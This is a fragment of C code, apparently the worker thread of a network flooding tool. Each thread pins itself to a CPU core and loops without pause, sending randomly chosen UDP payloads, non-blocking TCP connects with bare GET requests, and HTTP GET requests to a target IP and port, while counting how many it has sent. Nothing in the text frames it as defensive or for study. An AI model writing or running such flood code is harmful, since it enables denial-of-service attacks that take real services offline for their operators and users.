    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    while (running) {
        int type = rand() % 3;
        if (type == 0) {  // UDP
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
            d.sin_addr.s_addr = inet_addr(ip);
            int idx = rand() % udp_payload_count;
            sendto(sock, udp_payloads[idx], strlen(udp_payloads[idx]), 0, (struct sockaddr*)&d, sizeof(d));
            close(sock);
        } else if (type == 1) {  // TCP
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
            d.sin_addr.s_addr = inet_addr(ip);
            fcntl(sock, F_SETFL, O_NONBLOCK);
            connect(sock, (struct sockaddr*)&d, sizeof(d));
            send(sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_NOSIGNAL);
            close(sock);
        } else {  // HTTP
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
            d.sin_addr.s_addr = inet_addr(ip);
            if (connect(sock, (struct sockaddr*)&d, sizeof(d)) == 0) {
                char req[512];
                snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", ip);
                send(sock, req, strlen(req), MSG_NOSIGNAL);
            }
            close(sock);
        }
        local_sent++;
        if ((local_sent & 0xFF) == 0) sched_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent);
    return NULL;
}

